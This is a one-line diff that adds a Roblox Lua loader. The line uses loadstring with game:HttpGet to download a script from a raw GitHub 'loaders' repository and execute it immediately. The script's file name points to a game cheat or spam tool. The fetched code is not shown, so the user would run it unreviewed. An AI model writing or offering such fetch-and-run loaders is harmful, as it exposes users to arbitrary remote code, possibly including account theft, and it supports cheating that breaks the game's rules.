@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/butcher-x-violence-district-spam0-vkqzjdr1o5qvq8.lua"))()
